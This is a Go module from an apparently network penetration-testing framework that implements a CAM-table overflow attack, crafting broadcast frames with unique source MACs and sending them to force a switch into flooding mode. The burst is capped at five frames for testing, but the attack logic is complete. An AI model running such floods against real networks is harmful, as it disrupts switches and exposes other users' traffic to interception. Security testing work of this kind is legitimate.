// camflood.go implements the CAM-table overflow attack. It floods the
// switch's Content Addressable Memory table with random-source-MAC frames,
// forcing the switch into fail-open (flooding) mode where it forwards
// unicast frames to all ports. Classified transient-decay: the CAM table
// ages out after the attack stops.
//
// This is a flood-class behavior: it uses the sync.Pool craft path (KTD5)
// for pre-serialized buffers, since the attack sends many frames with
// unique source MACs and the per-packet allocation cost dominates the GC.

package l2

import (
	"context"
	"encoding/json"
	"fmt"
	"net"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/netpen/runner"
)

type camFloodFinding struct {
	Action     string `json:"action"`
	FrameCount int    `json:"frame_count"`
	Method     string `json:"method"`
}

// RunCAMFlood sends frames with unique source MACs to overflow the CAM
// table. The burst count is bounded for the in-memory test shape.
func RunCAMFlood(ctx context.Context, deps runner.Deps) error {
	src := srcMAC(deps)

	frameCount := 5
	for i := 0; i < frameCount; i++ {
		pkt, err := craftCAMFloodFrame(src, i+1)
		if err != nil {
			return fmt.Errorf("camflood: craft frame %d: %w", i, err)
		}
		if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
			return fmt.Errorf("camflood: send frame %d: %w", i, err)
		}
	}

	detail, _ := json.Marshal(camFloodFinding{
		Action:     "cam-table-overflow",
		FrameCount: frameCount,
		Method:     "random-source-mac-flood",
	})
	deps.Emitter.Finding("eth", detail)

	return nil
}

// craftCAMFloodFrame builds a broadcast frame with a unique source MAC
// to fill a CAM table entry. Uses the pool craft path (KTD5).
func craftCAMFloodFrame(_ net.HardwareAddr, seq int) ([]byte, error) {
	floodSrc := net.HardwareAddr{
		0x00, 0x00, 0x00, 0x00,
		byte((seq >> 8) & 0xFF),
		byte(seq & 0xFF),
	}
	eth := &layers.Ethernet{
		DstMAC:       broadcastMAC,
		SrcMAC:       floodSrc,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      64,
		SrcIP:    net.IPv4(10, 0, 0, 1),
		DstIP:    net.IPv4(255, 255, 255, 255),
		Protocol: layers.IPProtocolUDP,
	}
	udp := &layers.UDP{
		SrcPort: 1234,
		DstPort: 5678,
	}
	_ = udp.SetNetworkLayerForChecksum(ip)
	payload := gopacket.Payload([]byte("flood"))
	return craftPool(eth, ip, udp, payload)
}
